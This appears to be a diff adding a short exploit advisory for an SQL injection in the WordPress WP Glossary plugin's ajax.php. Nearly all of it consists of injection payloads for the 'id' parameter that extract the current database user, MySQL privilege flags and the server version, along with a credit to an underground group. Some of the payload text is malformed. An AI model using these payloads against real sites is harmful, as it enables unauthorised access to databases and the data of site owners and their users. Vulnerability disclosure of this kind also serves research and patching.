@@ -1,0 +1,26 @@
+######################################################
+# Exploit Title: WordPress WP Glossary plugin SQL Injection Vulnerability
+# Date: 2011-30-10
+# Author: longrifle0x
+# software: Wordpress
+# Download: http://wordpress.org/extend/plugins/wp-glossary/
+# Tools: SQLMAP
+######################################################
+
+*DESCRIPTIONDiscovered a vulnerability in WP Glossary, Wordpress Plugin,
+vulnerability is SQL injection.
+File: wp-content/plugins/wp-glossary/ajax.php
+Exploit: id=-1; or 1=if
+
+*Exploitation*
+http://localhost:80/wp-content/plugins/wp-glossary/ajax.php
+ [GET][id=-1][CURRENT_USER()
+http://localhost:80/wp-content/plugins/wp-glossary/ajax.php
+ [GET][id=-1][SELECT
+(CASE WHEN ((SELECT super_priv FROMmysql.user WHERE user='None' LIMIT
+0,1)='Y') THEN 1 ELSE 0 END)
+http://localhost:80/
+wp-content/plugins/wp-glossary/ajax.php [GET][id=-1][MID((VERSION()),1,6)
+
+
+***Greetz: Georgian Underground Community***
